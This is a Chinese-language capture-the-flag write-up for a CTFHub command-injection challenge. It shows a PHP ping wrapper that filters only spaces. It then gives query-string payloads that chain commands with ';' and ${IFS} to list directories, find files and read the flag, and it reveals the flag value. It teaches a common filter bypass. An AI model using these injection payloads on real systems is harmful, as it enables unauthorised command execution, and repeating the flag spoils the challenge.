---
title: CTFHub-RCE-过滤空格 Writeup
date: 2026-10-24
category: web
tags: [CTFHub, RCE, 命令注入, 绕过]
---

## 漏洞分析

### 源码审计
访问靶机首页，查看源码：
<?php $res = FALSE; if (isset($_GET['ip']) && $_GET['ip']) { $ip = $_GET['ip']; $m = []; if (!preg_match_all("/ /", $ip, $m)) { $cmd = "ping -c 4 {$ip}"; exec($cmd, $res); } else { $res = $m; } } ?>

### 漏洞点：
1. 存在任意命令执行漏洞。
2. preg_match_all("/ /", ...) 过滤了空格字符。在 Linux 命令行中，命令和参数之间必须有空格，因此常规命令注入被阻断。

## 解题步骤

### 第一步：利用环境变量绕过空格
在 Linux Shell 中，${IFS}（Internal Field Separator）是默认的空格/制表符分隔符。利用它可以代替空格。
构造 Payload 列目录：
?ip=127.0.0.1;ls${IFS}/
回显根目录文件，未直接发现 flag。

### 第二步：全局搜索 Flag 文件
利用 find 命令搜索带有 flag 的文件：
?ip=127.0.0.1;find${IFS}/${IFS}-name${IFS}"flag*"
回显中确认目标文件名为 flag_30356571425863.php，位于默认网站目录 /var/www/html/ 下。

### 第三步：读取 Flag
拼接完整路径使用 cat 读取：
?ip=127.0.0.1;cat${IFS}/var/www/html/flag_30356571425863.php
由于输出内容包含 <?php 标签，被浏览器当做 HTML 隐藏。右键“查看网页源代码”（Ctrl+U），搜索 ctfhub{ 成功获取 Flag：
### ctfhub{a9b74182318ca87efca4d52b}
